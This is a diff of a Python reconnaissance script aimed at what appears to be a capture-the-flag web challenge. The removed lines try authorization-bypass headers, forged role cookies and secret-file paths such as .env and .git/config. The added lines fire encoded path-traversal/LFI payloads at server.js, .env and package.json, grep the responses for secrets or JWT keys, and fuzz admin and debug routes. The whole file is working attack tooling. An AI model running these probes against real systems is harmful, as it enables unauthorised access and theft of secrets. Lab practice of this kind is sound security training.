@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
-import json, re, urllib.request, urllib.error
+import re, urllib.request, urllib.error
 
 BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"
 
-def req(path, cookie=None, headers=None, method="GET"):
-    r = urllib.request.Request(BASE + path, method=method)
-    r.add_header("User-Agent", "Mozilla/5.0 recon")
+def req(path, cookie=None, headers=None):
+    # do not let urllib normalize away ../ : build opener manually
+    r = urllib.request.Request(BASE + path)
+    r.add_header("User-Agent", "Mozilla/5.0 recon2")
     if cookie: r.add_header("Cookie", cookie)
     for k, v in (headers or {}).items():
         r.add_header(k, v)
@@ -17,84 +18,72 @@ def req(path, cookie=None, headers=None, method="GET"):
     except Exception as e:
         return -1, {}, f"ERR {e}"
 
-def denied(b): return ("Commissioner access only" in b) or ("league role is" in b)
+def line(st, p, hh, body):
+    is404 = ("Cannot GET" in body) or st == 404
+    snip = re.sub(r"\s+", " ", body)[:120]
+    tag = "   " if is404 else "***"
+    print(f"{tag} {st:>4} {p:48} ct={hh.get('Content-Type','')[:22]:22} {snip}")
+    return not is404
 
-print("################ RAW HOMEPAGE ################")
-st, h, body = req("/")
-print("status", st)
-print("HEADERS:", json.dumps(h, indent=1)[:1500])
-print("RAW HTML:\n", body)
+print("############ /public/site.css ############")
+st, hh, body = req("/public/site.css")
+print("status", st, "len", len(body))
+print(body[:800])
+# any secret-looking comments?
+for m in re.findall(r"/\*.*?\*/", body, re.S):
+    print("CSS COMMENT:", m[:300])
 
-print("\n################ RAW /commissioner (no cookie) ################")
-st, h, body = req("/commissioner")
-print("status", st)
-print("RAW HTML:\n", body)
+print("\n############ /public enumeration ############")
+pub = ["/public/", "/public", "/public/index.html", "/public/app.js", "/public/main.js",
+    "/public/site.js", "/public/script.js", "/public/bundle.js", "/public/server.js",
+    "/public/app.py", "/public/index.js", "/public/.env", "/public/config.js",
+    "/public/config.json", "/public/secret.txt", "/public/flag.txt", "/public/README.md",
+    "/public/package.json", "/public/site.css.map", "/public/robots.txt"]
+for p in pub:
+    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))
 
-# fresh member cookie
-st, h, _ = req("/")
-mm = re.search(r"wo_session=([^;]+)", h.get("Set-Cookie",""))
-member = mm.group(1) if mm else None
-print("\nmember cookie:", member)
-
-print("\n################ HEADER / IP BYPASS TESTS on /commissioner ################")
-bypass_headers = [
-    {"X-Forwarded-For": "127.0.0.1"},
-    {"X-Forwarded-For": "::1"},
-    {"X-Real-IP": "127.0.0.1"},
-    {"X-Originating-IP": "127.0.0.1"},
-    {"X-Forwarded-Host": "localhost"},
-    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
-    {"X-Role": "commissioner"},
-    {"X-League-Role": "commissioner"},
-    {"X-Commissioner": "true"},
-    {"X-Admin": "true"},
-    {"Role": "commissioner"},
-    {"X-Original-URL": "/commissioner"},
-    {"X-Rewrite-URL": "/commissioner"},
-    {"Host": "localhost"},
-    {"X-Forwarded-Server": "localhost"},
-    {"Authorization": "Bearer commissioner"},
-    {"Referer": BASE + "/commissioner"},
+print("\n############ PATH TRAVERSAL / LFI via static ############")
+targets = ["server.js", "app.js", "index.js", "package.json", ".env", "config.js"]
+trav_tpls = [
+    "/public/../{f}",
+    "/public/../../{f}",
+    "/public/../../../{f}",
+    "/public/..%2f{f}",
+    "/public/..%2f..%2f{f}",
+    "/public/..%2f..%2f..%2f{f}",
+    "/public/%2e%2e/{f}",
+    "/public/%2e%2e%2f%2e%2e%2f{f}",
+    "/public/....//{f}",
+    "/public/....//....//{f}",
+    "/public/..%252f{f}",
+    "/public/%2e%2e%2f{f}",
+    "/public/..\\{f}",
+    "/public/..%5c{f}",
+    "/static/../{f}",
+    "/..%2f{f}",
+    "/{f}",
 ]
-for hd in bypass_headers:
-    st, hh, body = req("/commissioner", cookie=(f"wo_session={member}" if member else None), headers=hd)
-    print(f"[{'DENIED' if denied(body) else '*** GRANTED ***'}] status={st} hdr={hd} len={len(body)}")
-    if not denied(body):
-        print("BODY:\n", body[:3000])
+hit_secret = None
+for f in targets:
+    for tpl in trav_tpls:
+        p = tpl.format(f=f)
+        st, hh, body = req(p)
+        ok = ("Cannot GET" not in body) and st == 200 and "<!doctype html>" not in body.lower()[:40]
+        if ok:
+            print(f"*** POSSIBLE LFI {st} {p}")
+            print(body[:1500])
+            sm = re.search(r"(secret|SECRET|jwt|JWT)[^\n]{0,80}", body)
+            if sm: print("   SECRET-LINE:", sm.group(0))
 
-print("\n################ COOKIE VARIANTS ################")
-cookie_tests = [
-    "role=commissioner",
-    "wo_role=commissioner",
-    f"wo_session={member}; role=commissioner" if member else "role=commissioner",
-    "commissioner=true",
-    "is_commissioner=true",
-    "admin=true",
-]
-for c in cookie_tests:
-    st, hh, body = req("/commissioner", cookie=c)
-    print(f"[{'DENIED' if denied(body) else '*** GRANTED ***'}] cookie={c[:60]} status={st}")
-    if not denied(body):
-        print("BODY:\n", body[:3000])
-
-print("\n################ SOURCE / SECRET DISCLOSURE ################")
-paths = [
-    "/.env", "/.env.local", "/package.json", "/package-lock.json", "/server.js",
-    "/app.js", "/index.js", "/main.js", "/config.js", "/config.json", "/.git/HEAD",
-    "/.git/config", "/source", "/src/server.js", "/src/app.js", "/static/app.js",
-    "/js/app.js", "/js/main.js", "/dist/main.js", "/bundle.js", "/flag", "/flag.txt",
-    "/api/config", "/api/debug", "/debug", "/sitemap.xml", "/.well-known/security.txt",
-    "/server.js.bak", "/app.js.bak", "/index.js.map", "/main.js.map", "/README.md",
-    "/Dockerfile", "/docker-compose.yml", "/.dockerignore", "/secret", "/secrets",
-    "/commissioner/", "/commissioner.js", "/api/commissioner/settings",
-]
-for p in paths:
-    st, hh, body = req(p)
-    interesting = st not in (404,) and "Cannot GET" not in body
-    tag = "***" if interesting else "   "
-    snippet = re.sub(r"\s+", " ", body)[:160]
-    print(f"{tag} {st:>4} {p:35} ct={hh.get('Content-Type','')[:25]:25} {snippet}")
-    if interesting and any(k in body.lower() for k in ["secret","flag","jwt","password","commissioner"]):
-        print("     >>>", re.sub(r"\s+"," ",body)[:500])
+print("\n############ ROUTE FUZZ ############")
+routes = ["/dashboard","/manage","/roster","/trade","/transactions","/waivers","/draft",
+    "/matchup","/team","/teams","/health","/status","/version","/flag","/api/health",
+    "/api/status","/api/flag","/api/team","/api/league","/api/players","/api/scores",
+    "/api/user","/api/session","/api/settings","/settings","/console","/admin","/manage",
+    "/commissioner/flag","/commissioner/data","/commissioner/console","/lineup",
+    "/api/commissioner/settings","/api/v1","/graphql","/whoami","/debug","/env",
+    "/.git/HEAD","/.git/config","/backup.zip","/source.zip","/app.zip","/site.zip"]
+for p in routes:
+    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))
 
 print("\nDONE")
